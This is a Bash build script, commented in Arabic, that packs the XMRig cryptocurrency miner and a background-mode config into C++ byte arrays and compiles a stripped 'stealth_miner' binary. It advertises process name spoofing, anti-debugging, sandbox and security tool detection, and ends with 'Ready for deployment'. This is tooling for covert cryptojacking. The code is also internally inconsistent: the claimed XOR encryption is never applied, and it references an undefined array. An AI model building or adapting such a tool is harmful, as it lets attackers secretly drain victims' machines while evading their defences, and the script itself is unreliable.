#!/bin/bash

# crypt_xmrig - أداة دمج XMRig مع نظام التمويه المتقدم
# الاستخدام: ./crypt_xmrig

set -e

echo "======================================"
echo "🥷 crypt_xmrig - XMRig Stealth Embedder"
echo "======================================"

# التحقق من وجود الملفات المطلوبة
if [[ ! -f "xmrig" ]]; then
    echo "❌ Error: xmrig binary not found in current directory"
    echo "Please download or build xmrig and place it here"
    exit 1
fi

if [[ ! -f "config.json" ]]; then
    echo "⚠️  Warning: config.json not found, creating default one..."
    cat > config.json << 'EOF'
{
    "algo": "rx/0",
    "pools": [
        {
            "url": "127.0.0.1:3333",
            "user": "test",
            "pass": "x"
        }
    ],
    "cpu": {
        "enabled": true,
        "max-threads-hint": 50
    },
    "log-file": null,
    "syslog": false,
    "background": true
}
EOF
    echo "✅ Default config.json created"
fi

echo "📁 Files found:"
echo "   - xmrig: $(ls -lh xmrig | awk '{print $5}')"
echo "   - config.json: $(ls -lh config.json | awk '{print $5}')"

# إنشاء مجلد الإخراج
mkdir -p output
cd output

echo ""
echo "🔄 Step 1: Converting XMRig to C++ array..."
## توليد مفتاح XOR عشوائي وضغط البلايناري
head -c 16 /dev/urandom > xor_key.bin
gzip -c ../xmrig > xmrig.gz

## تضمين البيانات المشفرة والمفتاح
echo '#include "binary_embedder.h"' > embedded_data.cpp
echo '' >> embedded_data.cpp
echo '// XMRig binary embedded as compressed+XOR encrypted byte array' >> embedded_data.cpp
echo 'const unsigned char embedded_xmrig_encrypted[] = {' >> embedded_data.cpp
xxd -i < xmrig.gz | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_data.cpp
echo '};' >> embedded_data.cpp
echo 'const size_t embedded_xmrig_encrypted_size = sizeof(embedded_xmrig_encrypted);' >> embedded_data.cpp

echo '' >> embedded_data.cpp
echo '// XOR decryption key' >> embedded_data.cpp
echo 'const unsigned char xor_key[] = {' >> embedded_data.cpp
xxd -i < xor_key.bin | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_data.cpp
echo '};' >> embedded_data.cpp
echo 'const size_t xor_key_size = sizeof(xor_key);' >> embedded_data.cpp

echo '};' >> embedded_data.cpp
echo '' >> embedded_data.cpp
echo "const size_t embedded_xmrig_size = sizeof(embedded_xmrig);" >> embedded_data.cpp
echo '' >> embedded_data.cpp

echo "🔄 Step 2: Converting config.json to C++ array..."

# تحويل config.json إلى hex array
echo '// Config.json embedded as byte array' >> embedded_data.cpp
echo 'const unsigned char embedded_config[] = {' >> embedded_data.cpp

xxd -i < ../config.json | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_data.cpp

echo '};' >> embedded_data.cpp
echo '' >> embedded_data.cpp
echo "const size_t embedded_config_size = sizeof(embedded_config);" >> embedded_data.cpp

echo "✅ Embedded data created: embedded_data.cpp"

echo ""
echo "🔄 Step 3: Copying source files..."

# نسخ ملفات السورس (من نفس المجلد)
cp main.cpp ./
cp evasion_monitor.cpp ./
cp evasion_monitor.h ./
cp binary_embedder.h ./

# استبدال binary_embedder.cpp بالبيانات الحقيقية
cp embedded_data.cpp binary_embedder.cpp

echo "✅ Source files copied and updated"

echo ""
echo "🔄 Step 4: Compiling stealth miner..."

# بناء المشروع
g++ -D_GNU_SOURCE -fPIE -pie -fstack-protector-strong -Wl,-z,relro,-z,now -Wl,-z,noexecstack -o stealth_miner \
    main.cpp \
    evasion_monitor.cpp \
    binary_embedder.cpp \
    -pthread \
    -std=c++11 \
    -O2 \
    -s \
    -lz

if [[ $? -eq 0 ]]; then
    echo "✅ Compilation successful!"
    
    # معلومات الملف النهائي
    echo ""
    echo "📊 Output file info:"
    echo "   - Name: stealth_miner"
    echo "   - Size: $(ls -lh stealth_miner | awk '{print $5}')"
    echo "   - Path: $(pwd)/stealth_miner"
    
    echo ""
    echo "🎯 Usage:"
    echo "   ./stealth_miner    # Run the stealth miner"
    echo ""
    echo "🛡️  Features included:"
    echo "   ✓ XMRig embedded (no external files needed)"
    echo "   ✓ Advanced evasion techniques"
    echo "   ✓ Process name spoofing"
    echo "   ✓ Anti-debugging protection"
    echo "   ✓ VM/Sandbox detection"
    echo "   ✓ Security tool detection"
    echo "   ✓ Automatic cleanup"
    
    echo ""
    echo "🚀 Ready for deployment!"
    
else
    echo "❌ Compilation failed!"
    echo "Please check the error messages above"
    exit 1
fi

echo ""
echo "======================================"
echo "✅ crypt_xmrig completed successfully!"
echo "======================================"
